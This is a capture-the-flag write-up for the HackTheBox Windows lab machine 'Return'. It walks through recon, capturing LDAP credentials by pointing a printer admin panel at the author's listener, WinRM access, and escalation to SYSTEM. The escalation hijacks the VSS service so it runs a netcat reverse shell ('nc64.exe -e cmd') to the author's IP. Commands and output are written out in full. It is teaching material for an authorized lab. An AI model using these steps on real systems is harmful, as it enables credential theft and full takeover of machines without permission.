---
title: HTB: Return
url: https://0xdf.gitlab.io/2022/05/05/htb-return.html
date: 2022-05-05T09:00:00+00:00
difficulty: Easy [20]
os: Windows
tags: ctf, hackthebox, htb-return, nmap, windows, crackmapexec, printer, feroxbuster, ldap, wireshark, evil-winrm, server-operators, service, service-hijack, windows-service, htb-fuse, htb-blackfield, oscp-like-v3
---

![Return](https://0xdfimages.gitlab.io/img/return-cover.png)

Return was a straight forward box released for the HackTheBox printer track. This time I’ll abuse a printer web admin panel to get LDAP credentials, which can also be used for WinRM. The account is in the Server Operators group, which allows it to modify, start, and stop services. I’ll abuse this to get a shell as SYSTEM.

## Box Info

| Name | [Return](https://hackthebox.com/machines/return)  [Return](https://hackthebox.com/machines/return) [Play on HackTheBox](https://hackthebox.com/machines/return) |
| --- | --- |
| Release Date | 27 Sep 2021 |
| Retire Date | 27 Sep 2021 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.108
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-03 18:28 UTC
Nmap scan report for 10.10.11.108
Host is up (0.090s latency).
Not shown: 65509 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49679/tcp open  unknown
49682/tcp open  unknown
49694/tcp open  unknown
58656/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 9.23 seconds
oxdf@hacky$ nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV -oA scans/nmap-tcpscripts 10.10.11.108
Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-03 18:29 UTC
Nmap scan report for 10.10.11.108
Host is up (0.091s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-03 18:48:11Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/3%Time=62717493%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m35s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-05-03T18:50:32
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 280.29 seconds

```

This looks like a Windows host with a lot of the ports I would expect on a Domain Controller (53, 88, 135, 139, 445, 389, etc). WinRM (5985) is open, which is something I’ll check if I find creds.

Based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), this host is likely Windows 10+ or Server 2016+.

### SMB - TCP 445

`crackmapexec` shows that the hostname os `PRINTER.return.local`, and I need auth to get any additional information from SMB:

```

oxdf@hacky$ crackmapexec smb 10.10.11.108 --shares
SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)

```

### Website - TCP 80

#### Site

The site is the “HTB Printer Admin Panel”:

![image-20220503144227581](https://0xdfimages.gitlab.io/img/image-20220503144227581.png)

“Settings” leads to `/settings.php`, which presents a form:

![image-20220503144306498](https://0xdfimages.gitlab.io/img/image-20220503144306498.png)

The “Fax” and “Troubleshooting” links don’t go anywhere.

#### Tech Stack

Everything points to this site being written in PHP, including the page extensions and the response headers:

```

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.4.13
Date: Tue, 03 May 2022 19:00:39 GMT
Connection: close
Content-Length: 28274

```

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP as well as a lowercase wordlist since IIS is case-insensitive:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.108 -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.108
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt         
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]       
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        2l       10w      150c http://10.10.11.108/images => http://10.10.11.108/images/
200      GET     1345l     2796w    28274c http://10.10.11.108/
200      GET     1345l     2796w    28274c http://10.10.11.108/index.php
200      GET     1376l     2855w    29090c http://10.10.11.108/settings.php
[####################] - 1m    159504/159504  0s      found:4       errors:0      
[####################] - 1m     53168/53168   515/s   http://10.10.11.108 
[####################] - 1m     53168/53168   516/s   http://10.10.11.108/images 
[####################] - 1m     53168/53168   515/s   http://10.10.11.108/ 

```

Nothing new or interesting there.

## Shell as svc-printer

### LDAP Credentials

#### In Page [Fail]

My first thought on seeing the `settings.php` page is that it’s populating the “Password” field for me.

![image-20220503144802220](https://0xdfimages.gitlab.io/img/image-20220503144802220.png)

This could be a case where the actual password is being populated into this field, and it’s just being displayed as `*`. But looking in Firefox dev tools, it’s actually pre-filling that field with all `*`, not the password:

![image-20220503144842743](https://0xdfimages.gitlab.io/img/image-20220503144842743.png)

#### Request

When I submit this form, it sends a POST to `/settings.php`. The POST body only has one argument:

```

ip=printer.return.local

```

The other three fields in the form are not even sent. If the page does anything with this input, the user can only change the host (or “ip”), and not the port, username, or password.

#### Watch Request

I’ll change the hostname to my tun0 IP, and start `nc` listening on port 389. I’ll also start Wireshark. On clicking “Update”, there’s a connection at `nc`:

```

oxdf@hacky$ nc -lnvp 389
Listening on 0.0.0.0 389
Connection received on 10.10.11.108 60662
0*`%return\svc-printer
                      1edFg43012!!

```

It’s probably clear from just that what the username and password that it’s trying to authenticate, but Wireshark breaks it out more nicely:

![image-20220503145334307](https://0xdfimages.gitlab.io/img/image-20220503145334307.png)

It’s an LDAP bindRequest, with the username return\svc-printer and the simple authentication (password) of “1edFg43012!!”.

### WinRM

#### Test Creds

The obvious next step is to look at LDAP, but before that, I’ll check and see if these creds happen to give more direct access. They work for SMB:

```

oxdf@hacky$ crackmapexec smb 10.10.11.108 --shares -u svc-printer -p '1edFg43012!!'
SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
SMB         10.10.11.108    445    PRINTER          [+] Enumerated shares
SMB         10.10.11.108    445    PRINTER          Share           Permissions     Remark
SMB         10.10.11.108    445    PRINTER          -----           -----------     ------
SMB         10.10.11.108    445    PRINTER          ADMIN$          READ            Remote Admin
SMB         10.10.11.108    445    PRINTER          C$              READ,WRITE      Default share
SMB         10.10.11.108    445    PRINTER          IPC$            READ            Remote IPC
SMB         10.10.11.108    445    PRINTER          NETLOGON        READ            Logon server share 
SMB         10.10.11.108    445    PRINTER          SYSVOL          READ            Logon server share 

```

Most interestingly, they also work for WinRM:

```

oxdf@hacky$ crackmapexec winrm 10.10.11.108 -u svc-printer -p '1edFg43012!!'
SMB         10.10.11.108    5985   PRINTER          [*] Windows 10.0 Build 17763 (name:PRINTER) (domain:return.local)
HTTP        10.10.11.108    5985   PRINTER          [*] http://10.10.11.108:5985/wsman
WINRM       10.10.11.108    5985   PRINTER          [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)

```

#### Evil-WinRM

I’ll use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to connect and get a shell:

```

oxdf@hacky$ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer\Documents>

```

And I can access `user.txt`:

```
*Evil-WinRM* PS C:\Users\svc-printer\desktop> type user.txt
c0118264************************

```

## Shell as SYSTEM

### Enumeration

#### Privileges

This account has a few interesting privileges:

```
*Evil-WinRM* PS C:\Users\svc-printer\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

```

There’s a bunch of stuff here that could lead to SYSTEM access. For example, I showed in [Fuse](/2020/10/31/htb-fuse.html#priv-svc-print--system) how to abuse `SeLoadDriverPrivilege` by loading a vulnerable driver and exploiting it. I’ve shown using `SeBackupPrivilege` to get arbitrary file read (for example, in [Blackfield](/2020/10/03/htb-blackfield.html#shell-as-svc_backup)). `SeMachineAccountPrivilege` allows me to add a machine to the domain, and I could likely escalate there as well.

#### Groups

This user is also in several groups:

```
*Evil-WinRM* PS C:\Users\svc-printer\desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

```

There may be others of interest, but Server Operators jumps out immediately. [This group](https://ss64.com/nt/syntax-security_groups.html#:~:text=A%20built%2Din%20group%20that,and%20shut%20down%20the%20computer.) can do a lot of things:

> A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.
> Default [User Rights](https://ss64.com/nt/ntrights.html):
> Allow log on locally: SeInteractiveLogonRight
> Back up files and directories: SeBackupPrivilege
> Change the system time: SeSystemTimePrivilege
> Change the time zone: SeTimeZonePrivilege
> Force shutdown from a remote system: SeRemoteShutdownPrivilege
> Restore files and directories SeRestorePrivilege
> Shut down the system: SeShutdownPrivilege

### Malicious Service

#### Reverse Shell

This user can modify, start, and stop services, so I’ll abuse this by having it run `nc64.exe` to give a reverse shell.

I’ll upload `nc64.exe` to Return:

```
*Evil-WinRM* PS C:\programdata> upload /opt/netcat/nc64.exe
Info: Uploading /opt/netcat/nc64.exe to C:\programdata\nc64.exe
                                                             
Data: 60360 bytes of 60360 bytes copied

Info: Upload successful!

```

Cube0x0 has a [nice post](https://cube0x0.github.io/Pocing-Beyond-DA/) that includes many privesc techniques, including this one.

Typically, I would want to get a list of services that this account can modify, but it seems this user doesn’t have access to the Service Control Manager:

```
*Evil-WinRM* PS C:\programdata> sc.exe query
[SC] OpenSCManager FAILED 5:

Access is denied.
*Evil-WinRM* PS C:\programdata> $services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where {$_.access.IdentityReference -match 'Server Operators'}}
Cannot open Service Control Manager on computer '.'. This operation might require other privileges.
At line:1 char:12                                                                                        
+ $services=(get-service).name | foreach {(Get-ServiceAcl $_)  | where  ...                              
+            ~~~~~~~~~~~                                                                                 
    + CategoryInfo          : NotSpecified: (:) [Get-Service], InvalidOperationException
    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.GetServiceCommand

```

Going in a bit blind, I’ll try the one that Cube0x0 shows in the post:

```
*Evil-WinRM* PS C:\programdata> sc.exe config VSS binpath="C:\programdata\nc64.exe -e cmd 10.10.14.6 443"
[SC] ChangeServiceConfig SUCCESS

```

It works! I’ll try to stop the service, but it’s not started. Then I’ll start it:

```
*Evil-WinRM* PS C:\programdata> sc.exe stop VSS
[SC] ControlService FAILED 1062:

The service has not been started.
*Evil-WinRM* PS C:\programdata> sc.exe start VSS
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

```

At first there’s no response here, and a connection at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.108 54572
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```

After 30 seconds, the service times out, and returns an error message:

```
*Evil-WinRM* PS C:\programdata> sc.exe start VSS
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

```

At that same point, the shell dies. Still, if I move quickly, I can get the flag:

```

C:\Users\Administrator\Desktop>type root.txt
2e3771d0************************

```

#### Better Reverse Shell

When the service fails to start in a service way (there are specific requirements for a service binary), then it kills the running process. If I have the service binary actually be `cmd.exe`, and have that start `nc64.exe`, then the `nc64.exe` will continue even after `cmd.exe` is killed:

```
*Evil-WinRM* PS C:\programdata> sc.exe config VSS binpath="C:\windows\system32\cmd.exe /c C:\programdata\nc64.exe -e cmd 10.10.14.6 443"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\programdata> sc.exe start VSS
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

```

The shell comes back and lives past the timeout:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.108 49757
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

```